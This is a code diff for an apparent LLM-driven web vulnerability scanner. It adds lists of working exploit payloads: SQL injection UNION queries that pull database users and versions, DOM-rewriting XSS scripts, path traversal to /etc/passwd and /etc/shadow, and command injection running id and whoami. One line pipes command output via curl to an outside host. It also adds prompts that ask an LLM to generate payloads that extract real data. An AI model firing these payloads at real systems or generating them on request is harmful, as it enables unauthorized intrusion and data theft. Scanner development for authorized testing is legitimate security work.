@@ -31,12 +31,68 @@ class LLMClient:
     async def generate_confirmation_payload(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict]) -> List[str]:
         """Generate confirmation payloads for 100% verification"""
         raise NotImplementedError
+    
+    async def generate_exploit_payload(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict]) -> List[str]:
+        """Generate actual exploit payloads to prove exploitability"""
+        raise NotImplementedError
+    
+    async def verify_exploit(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
+        """Verify if the exploit actually worked and vulnerability is exploitable"""
+        raise NotImplementedError
 
 class BasicClient(LLMClient):
     """Basic client that works without AI - uses predefined payloads"""
     
     def __init__(self):
         super().__init__()
+        # Exploit payloads that actually demonstrate working vulnerabilities
+        self.exploit_payloads = {
+            'sql_injection': [
+                # These payloads extract real data to prove SQL injection works
+                "' UNION SELECT CONCAT('EXPLOIT_PROOF:',user,':',host) FROM mysql.user LIMIT 1--",
+                "' UNION SELECT CONCAT('EXPLOIT_PROOF:',database(),':',version(),':',user()) LIMIT 1--",
+                "'; SELECT CONCAT('EXPLOIT_PROOF:',COUNT(*)) FROM information_schema.tables--",
+                "' AND (SELECT SUBSTRING(CONCAT('EXPLOIT_PROOF:',@@version),1,50))='EXPLOIT_PROOF'--",
+                "' UNION SELECT CONCAT('EXPLOIT_PROOF:',schema_name) FROM information_schema.schemata LIMIT 1--",
+                "' OR 1=1 AND (SELECT 'EXPLOIT_PROOF' WHERE 1=1)='EXPLOIT_PROOF'--"
+            ],
+            'xss': [
+                # These payloads create visible proof of XSS execution
+                "<script>document.body.innerHTML='<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;font-size:50px;text-align:center;z-index:9999\"><h1>XSS EXPLOITED</h1><p>Proof of Exploitation</p></div>'</script>",
+                "<img src=x onerror=\"document.body.style.backgroundColor='red';document.body.innerHTML='<h1 style=color:white>XSS EXPLOITED - PROOF</h1>'\">",
+                "<svg onload=\"document.title='XSS EXPLOITED';alert('XSS EXPLOIT CONFIRMED: '+document.domain)\">",
+                "<iframe src=\"javascript:document.body.innerHTML='<h1 style=background:red;color:white>XSS EXPLOIT WORKING</h1>'\">",
+                "<script>fetch('/admin').then(r=>r.text()).then(data=>{if(data.includes('admin')){document.body.innerHTML='<h1 style=color:red>XSS+PRIVILEGE ESCALATION PROOF</h1>'}})</script>"
+            ],
+            'path_traversal': [
+                # These extract actual system files to prove path traversal
+                "../../../etc/passwd",
+                "../../../../etc/shadow", 
+                "../../../etc/hosts",
+                "../../../../proc/version",
+                "../../../etc/group",
+                "file:///etc/passwd"
+            ],
+            'command_injection': [
+                # These execute commands that create unique proof
+                "; echo 'COMMAND_EXPLOIT_PROOF:' && id && echo ':END_PROOF'",
+                "| echo 'COMMAND_EXPLOIT_PROOF:' && whoami && uname -a && echo ':END_PROOF'",
+                "; echo 'COMMAND_EXPLOIT_PROOF:' && cat /etc/passwd | head -3 && echo ':END_PROOF'",
+                "& echo 'COMMAND_EXPLOIT_PROOF:' && dir && echo ':END_PROOF'",
+                "; python -c \"print('COMMAND_EXPLOIT_PROOF:'+str(__import__('os').getuid())+'END_PROOF')\"",
+                "| curl -d \"EXPLOIT_PROOF_$(whoami)_$(date)\" http://httpbin.org/post 2>/dev/null || echo 'COMMAND_EXPLOIT_PROOF_NO_CURL'"
+            ],
+            'idor': [
+                # These test actual privilege escalation and data access
+                "?id=1&admin=true&role=administrator",
+                "/admin/users/1/delete",
+                "?user_id=1&action=promote&role=admin", 
+                "/api/user/1/sensitive_data",
+                "?id=0&debug=true&show_all=1",
+                "/user/../../admin/config.php"
+            ]
+        }
+        
         # Predefined payloads for different vulnerability types - organized by sophistication level
         self.basic_payloads = {
             'sql_injection': {
@@ -276,6 +332,113 @@ class BasicClient(LLMClient):
         """Generate confirmation payloads for 100% verification"""
         payloads = self.basic_payloads.get(vulnerability_type, {})
         return payloads.get('confirmation', [])
+    
+    async def generate_exploit_payload(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict]) -> List[str]:
+        """Generate actual exploit payloads to prove exploitability"""
+        return self.exploit_payloads.get(vulnerability_type, [])
+    
+    async def verify_exploit(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
+        """Verify if the exploit actually worked and vulnerability is exploitable"""
+        response_text = response_data.get('response_text', '').lower()
+        status_code = response_data.get('status_code', 200)
+        response_time = response_data.get('response_time', 0)
+        
+        exploit_indicators = []
+        exploitable = False
+        exploit_confidence = 0.0
+        
+        # Check for actual exploit success indicators
+        if vulnerability_type == 'sql_injection':
+            sql_exploit_indicators = [
+                'exploit_proof:', 'mysql.user', 'information_schema', 
+                'database():', 'version():', 'user():', '@@version'
+            ]
+            for indicator in sql_exploit_indicators:
+                if indicator in response_text:
+                    exploit_indicators.append(f"SQL exploit evidence: {indicator}")
+                    exploit_confidence += 0.4
+                    exploitable = True
+            
+            # Check for actual database data extraction
+            if 'root:' in response_text and '@' in response_text:
+                exploit_indicators.append("Database user data extracted - EXPLOITABLE")
+                exploit_confidence += 0.5
+                exploitable = True
+        
+        elif vulnerability_type == 'xss':
+            xss_exploit_indicators = [
+                'xss exploited', 'xss exploit', 'proof of exploitation',
+                'document.body.innerHTML', 'document.title', 'background:red'
+            ]
+            for indicator in xss_exploit_indicators:
+                if indicator in response_text:
+                    exploit_indicators.append(f"XSS exploit evidence: {indicator}")
+                    exploit_confidence += 0.4
+                    exploitable = True
+            
+            # Check for DOM manipulation proof
+            if 'background:red' in response_text or 'xss exploited' in response_text:
+                exploit_indicators.append("DOM manipulation successful - EXPLOITABLE")
+                exploit_confidence += 0.6
+                exploitable = True
+        
+        elif vulnerability_type == 'path_traversal':
+            path_exploit_indicators = [
+                'root:x:0:0:', 'daemon:', 'bin:', 'sys:', 'nobody:', 'www-data:',
+                '[boot loader]', 'proc/version', '/etc/group'
+            ]
+            for indicator in path_exploit_indicators:
+                if indicator in response_text:
+                    exploit_indicators.append(f"File system access: {indicator}")
+                    exploit_confidence += 0.4
+                    exploitable = True
+            
+            # Check for sensitive file content
+            if 'root:x:0:0:' in response_text:
+                exploit_indicators.append("Sensitive system file accessed - EXPLOITABLE")
+                exploit_confidence += 0.6
+                exploitable = True
+        
+        elif vulnerability_type == 'command_injection':
+            cmd_exploit_indicators = [
+                'command_exploit_proof:', 'uid=', 'gid=', 'end_proof',
+                'command_exploit_proof_no_curl'
+            ]
+            for indicator in cmd_exploit_indicators:
+                if indicator in response_text:
+                    exploit_indicators.append(f"Command execution proof: {indicator}")
+                    exploit_confidence += 0.4
+                    exploitable = True
+            
+            # Check for actual command output
+            if 'uid=' in response_text and 'gid=' in response_text:
+                exploit_indicators.append("System command executed - EXPLOITABLE")
+                exploit_confidence += 0.6
+                exploitable = True
+        
+        elif vulnerability_type == 'idor':
+            idor_exploit_indicators = [
+                'admin', 'role', 'sensitive_data', 'unauthorized', 'privilege'
+            ]
+            for indicator in idor_exploit_indicators:
+                if indicator in response_text:
+                    exploit_indicators.append(f"Privilege escalation evidence: {indicator}")
+                    exploit_confidence += 0.3
+                    exploitable = True
+            
+            # Check for admin access
+            if status_code == 200 and ('admin' in response_text or 'role' in response_text):
+                exploit_indicators.append("Unauthorized access gained - EXPLOITABLE")
+                exploit_confidence += 0.5
+                exploitable = True
+        
+        return {
+            'exploitable': exploitable,
+            'exploit_confidence': min(exploit_confidence, 1.0),
+            'exploit_indicators': exploit_indicators,
+            'exploit_proof': exploitable and exploit_confidence > 0.8,
+            'severity': 'CRITICAL' if exploitable and exploit_confidence > 0.8 else 'HIGH' if exploitable else 'NONE'
+        }
     
     async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
         """Basic response analysis without AI"""
@@ -522,6 +685,86 @@ class GeminiClient(LLMClient):
             logger.error(f"Failed to parse confirmation payloads from Gemini")
             return []
     
+    async def generate_exploit_payload(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict]) -> List[str]:
+        """Generate actual exploit payloads to prove exploitability"""
+        prompt = f"""
+        Generate EXPLOIT payloads for {vulnerability_type} that will PROVE the vulnerability is actually exploitable.
+        
+        Target: {target_info.get('url', 'unknown')}
+        Previous Indicators: {json.dumps([r.get('indicators', []) for r in previous_results[-2:]], indent=2)}
+        
+        Create 4-6 exploit payloads that will:
+        1. Actually exploit the {vulnerability_type} vulnerability 
+        2. Generate clear proof that the exploit worked
+        3. Extract real data or demonstrate real access
+        4. Be safe for testing (no destructive operations)
+        5. Include unique markers to prove exploitation
+        
+        EXPLOIT REQUIREMENTS:
+        - SQL Injection: Extract actual database information, user data, or version info with "EXPLOIT_PROOF:" marker
+        - XSS: Modify the DOM visibly, change page content, or execute JavaScript with clear proof
+        - Path Traversal: Access actual system files like /etc/passwd, /etc/hosts, or Windows system files  
+        - Command Injection: Execute commands that return system info with "COMMAND_EXPLOIT_PROOF:" marker
+        - IDOR: Access unauthorized data or admin functions with clear proof of privilege escalation
+        
+        Respond with ONLY a JSON array of exploit payloads:
+        ["exploit_payload1", "exploit_payload2", ...]
+        """
+        
+        response = await self.generate_response(prompt)
+        try:
+            payloads = json.loads(response)
+            return payloads if isinstance(payloads, list) else []
+        except json.JSONDecodeError:
+            logger.error(f"Failed to parse exploit payloads from Gemini")
+            return []
+    
+    async def verify_exploit(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
+        """Verify if the exploit actually worked and vulnerability is exploitable"""
+        prompt = f"""
+        Analyze this response to determine if the {vulnerability_type} exploit actually worked and is exploitable.
+        
+        Exploit Payload Used: {payload}
+        Response Status: {response_data.get('status_code')}
+        Response Time: {response_data.get('response_time')}s
+        Response Content: {response_data.get('response_text', '')[:1000]}
+        
+        CRITICAL: Only mark as exploitable if you see actual proof of exploitation, not just error messages or reflections.
+        
+        Look for EXPLOIT PROOF:
+        - SQL Injection: Actual database data extracted (usernames, database names, version info), "EXPLOIT_PROOF:" markers
+        - XSS: DOM modifications, JavaScript execution proof, page content changes, alerts firing
+        - Path Traversal: Actual file contents (passwd file, system files, config files)
+        - Command Injection: Command output (user IDs, system info), "COMMAND_EXPLOIT_PROOF:" markers
+        - IDOR: Unauthorized data access, admin interface access, privilege escalation proof
+        
+        SCORING:
+        - 1.0: Definitive exploitation proof (data extracted, commands executed, DOM modified)
+        - 0.8-0.9: Strong exploitation evidence 
+        - 0.5-0.7: Possible exploitation but needs verification
+        - 0.0-0.4: No real exploitation (just errors or reflections)
+        
+        Respond in JSON format:
+        {{
+            "exploitable": true/false,
+            "exploit_confidence": 0.0-1.0,
+            "exploit_indicators": ["specific evidence found"],
+            "exploit_proof": true/false,
+            "severity": "CRITICAL"/"HIGH"/"MEDIUM"/"LOW"/"NONE",
+            "explanation": "detailed analysis of what exploitation proof was found"
+        }}
+        """
+        
+        response = await self.generate_response(prompt)
+        try:
+            result = json.loads(response)
+            # Ensure all required fields exist
+            result.setdefault('exploit_proof', result.get('exploit_confidence', 0) > 0.8)
+            return result
+        except json.JSONDecodeError:
+            logger.error("Failed to parse exploit verification from Gemini")
+            return {"exploitable": False, "exploit_confidence": 0.0, "exploit_indicators": [], "exploit_proof": False, "severity": "NONE"}
+    
     async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
         """Analyze response to determine vulnerability and next steps"""
         prompt = f"""
@@ -712,6 +955,92 @@ class OllamaClient(LLMClient):
             logger.error(f"Failed to parse confirmation payloads from Ollama")
             return []
     
+    async def generate_exploit_payload(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict]) -> List[str]:
+        """Generate actual exploit payloads to prove exploitability"""
+        prompt = f"""
+        Generate EXPLOIT payloads for {vulnerability_type} that will PROVE the vulnerability is actually exploitable.
+        
+        Target: {target_info.get('url', 'unknown')}
+        Previous Indicators: {json.dumps([r.get('indicators', []) for r in previous_results[-2:]], indent=2)}
+        
+        Create 4-6 exploit payloads that will:
+        1. Actually exploit the {vulnerability_type} vulnerability 
+        2. Generate clear proof that the exploit worked
+        3. Extract real data or demonstrate real access
+        4. Be safe for testing (no destructive operations)
+        5. Include unique markers to prove exploitation
+        
+        EXPLOIT REQUIREMENTS:
+        - SQL Injection: Extract actual database information, user data, or version info with "EXPLOIT_PROOF:" marker
+        - XSS: Modify the DOM visibly, change page content, or execute JavaScript with clear proof
+        - Path Traversal: Access actual system files like /etc/passwd, /etc/hosts, or Windows system files  
+        - Command Injection: Execute commands that return system info with "COMMAND_EXPLOIT_PROOF:" marker
+        - IDOR: Access unauthorized data or admin functions with clear proof of privilege escalation
+        
+        Respond with ONLY a JSON array of exploit payloads:
+        ["exploit_payload1", "exploit_payload2", ...]
+        """
+        
+        response = await self.generate_response(prompt)
+        try:
+            payloads = json.loads(response)
+            return payloads if isinstance(payloads, list) else []
+        except json.JSONDecodeError:
+            logger.error(f"Failed to parse exploit payloads from Ollama")
+            return []
+    
+    async def verify_exploit(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
+        """Verify if the exploit actually worked and vulnerability is exploitable"""
+        prompt = f"""
+        Analyze this response to determine if the {vulnerability_type} exploit actually worked and is exploitable.
+        
+        Exploit Payload Used: {payload}
+        Response Status: {response_data.get('status_code')}
+        Response Time: {response_data.get('response_time')}s
+        Response Content: {response_data.get('response_text', '')[:1000]}
+        
+        CRITICAL: Only mark as exploitable if you see actual proof of exploitation, not just error messages or reflections.
+        
+        Look for EXPLOIT PROOF:
+        - SQL Injection: Actual database data extracted (usernames, database names, version info), "EXPLOIT_PROOF:" markers
+        - XSS: DOM modifications, JavaScript execution proof, page content changes, alerts firing
+        - Path Traversal: Actual file contents (passwd file, system files, config files)
+        - Command Injection: Command output (user IDs, system info), "COMMAND_EXPLOIT_PROOF:" markers
+        - IDOR: Unauthorized data access, admin interface access, privilege escalation proof
+        
+        SCORING:
+        - 1.0: Definitive exploitation proof (data extracted, commands executed, DOM modified)
+        - 0.8-0.9: Strong exploitation evidence 
+        - 0.5-0.7: Possible exploitation but needs verification
+        - 0.0-0.4: No real exploitation (just errors or reflections)
+        
+        Respond in JSON format:
+        {{
+            "exploitable": true/false,
+            "exploit_confidence": 0.0-1.0,
+            "exploit_indicators": ["specific evidence found"],
+            "exploit_proof": true/false,
+            "severity": "CRITICAL"/"HIGH"/"MEDIUM"/"LOW"/"NONE",
+            "explanation": "detailed analysis of what exploitation proof was found"
+        }}
+        """
+        
+        response = await self.generate_response(prompt)
+        try:
+            json_start = response.find('{')
+            json_end = response.rfind('}') + 1
+            if json_start != -1 and json_end != -1:
+                json_str = response[json_start:json_end]
+                result = json.loads(json_str)
+                # Ensure all required fields exist
+                result.setdefault('exploit_proof', result.get('exploit_confidence', 0) > 0.8)
+                return result
+            else:
+                return {"exploitable": False, "exploit_confidence": 0.0, "exploit_indicators": [], "exploit_proof": False, "severity": "NONE"}
+        except json.JSONDecodeError:
+            logger.error("Failed to parse exploit verification from Ollama")
+            return {"exploitable": False, "exploit_confidence": 0.0, "exploit_indicators": [], "exploit_proof": False, "severity": "NONE"}
+    
     async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
         """Analyze response using Ollama"""
         prompt = f"""
@@ -844,6 +1173,52 @@ class LLMManager:
         
         logger.error("All LLM clients failed to generate confirmation payloads")
         return []
+    
+    async def generate_exploit_payloads_with_fallback(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict], preference: str = "gemini") -> List[str]:
+        """Generate exploit payloads with fallback"""
+        client_order = [preference] + [k for k in self.clients.keys() if k != preference]
+        
+        for client_name in client_order:
+            if client_name in self.clients:
+                try:
+                    logger.info(f"Generating {vulnerability_type} exploit payloads with {client_name}")
+                    if hasattr(self.clients[client_name], 'generate_exploit_payload'):
+                        payloads = await self.clients[client_name].generate_exploit_payload(vulnerability_type, target_info, previous_results)
+                    else:
+                        # Fallback to confirmation level payloads
+                        payloads = await self.clients[client_name].generate_confirmation_payload(vulnerability_type, target_info, previous_results)
+                    if payloads:
+                        return payloads
+                except Exception as e:
+                    logger.error(f"Exploit payload generation failed with {client_name}: {str(e)}")
+                    continue
+        
+        logger.error("All LLM clients failed to generate exploit payloads")
+        return []
+    
+    async def verify_exploit_with_fallback(self, response_data: Dict, payload: str, vulnerability_type: str, preference: str = "gemini") -> Dict:
+        """Verify exploit with fallback"""
+        client_order = [preference] + [k for k in self.clients.keys() if k != preference]
+        
+        for client_name in client_order:
+            if client_name in self.clients:
+                try:
+                    logger.info(f"Verifying exploit with {client_name}")
+                    if hasattr(self.clients[client_name], 'verify_exploit'):
+                        result = await self.clients[client_name].verify_exploit(response_data, payload, vulnerability_type)
+                    else:
+                        # Fallback to basic verification
+                        result = {"exploitable": False, "exploit_confidence": 0.0, "exploit_indicators": [], "exploit_proof": False, "severity": "NONE"}
+                    if result:
+                        # Ensure all required fields exist
+                        result.setdefault('exploit_proof', result.get('exploit_confidence', 0) > 0.8)
+                        result.setdefault('severity', 'NONE')
+                        return result
+                except Exception as e:
+                    logger.error(f"Exploit verification failed with {client_name}: {str(e)}")
+                    continue
+        
+        return {"exploitable": False, "exploit_confidence": 0.0, "exploit_indicators": [], "exploit_proof": False, "severity": "NONE"}
     
     async def analyze_vulnerability_response_with_fallback(self, response_data: Dict, payload: str, vulnerability_type: str, preference: str = "gemini") -> Dict:
         """Analyze vulnerability response with fallback"""
